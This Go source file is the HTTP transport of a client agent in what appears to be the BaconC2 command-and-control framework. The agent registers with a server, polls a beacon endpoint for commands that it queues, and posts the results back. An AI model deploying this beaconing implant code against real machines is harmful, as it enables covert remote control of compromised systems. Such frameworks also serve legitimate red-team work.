package transport

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/RabbITCybErSeC/BaconC2/client/queue"
)

const (
	registerAPIPath = "%s/api/agents/register"
	beaconAPIPath   = "%s/api/agents/beacon?id=%s"
	resultAPIPath   = "%s/api/agents/result?id=%s"
)

type HTTPTransport struct {
	serverURL      string
	agentID        string
	httpClient     *http.Client
	commandQueue   queue.CommandQueue
	beaconInterval time.Duration
}

func NewHTTPTransport(serverURL, agentID string, commandQueue queue.CommandQueue) models.ITransportProtocol {
	return &HTTPTransport{
		serverURL:      serverURL,
		agentID:        agentID,
		httpClient:     &http.Client{Timeout: 10 * time.Second},
		commandQueue:   commandQueue,
		beaconInterval: 10 * time.Second,
	}
}

func (t *HTTPTransport) Initialize() error {
	return nil
}

func (t *HTTPTransport) Register(agent models.Agent) error {
	jsonData, err := json.Marshal(agent)
	if err != nil {
		return fmt.Errorf("failed to marshal agent: %w", err)
	}

	resp, err := t.httpClient.Post(fmt.Sprintf(registerAPIPath, t.serverURL), "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP registration error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusCreated {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("registration failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPTransport) Beacon() (models.Command, error) {
	var emptyCmd models.Command

	url := fmt.Sprintf(beaconAPIPath, t.serverURL, t.agentID)
	resp, err := t.httpClient.Post(url, "application/json", nil)
	if err != nil {
		return emptyCmd, fmt.Errorf("HTTP beacon error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return emptyCmd, fmt.Errorf("beacon failed with status %d: %s", resp.StatusCode, string(body))
	}

	var response struct {
		Command    models.Command `json:"command"`
		Status     string         `json:"status,omitempty"`
		NextBeacon int            `json:"nextBeacon,omitempty"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&response); err != nil {
		return emptyCmd, fmt.Errorf("failed to decode beacon response: %w", err)
	}

	// Update beacon interval if provided
	if response.NextBeacon > 0 {
		t.beaconInterval = time.Duration(response.NextBeacon) * time.Second
	}

	// If only "status" is returned (e.g., "acknowledged"), return an empty command
	if response.Command.ID == "" && response.Status == "acknowledged" {
		return emptyCmd, nil
	}

	// Add command to queue
	if err := t.commandQueue.Add(response.Command); err != nil {
		return emptyCmd, fmt.Errorf("failed to queue command: %w", err)
	}

	return response.Command, nil
}

func (t *HTTPTransport) SendResult(agentID string, result models.Command) error {
	jsonData, err := json.Marshal(result)
	if err != nil {
		return fmt.Errorf("failed to marshal result: %w", err)
	}

	url := fmt.Sprintf(resultAPIPath, t.serverURL, agentID)
	resp, err := t.httpClient.Post(url, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return fmt.Errorf("HTTP result send error: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("result send failed with status %d: %s", resp.StatusCode, string(body))
	}

	return nil
}

func (t *HTTPTransport) Close() error {
	t.httpClient.CloseIdleConnections()
	return nil
}

func (t *HTTPTransport) GetBeaconInterval() time.Duration {
	return t.beaconInterval
}
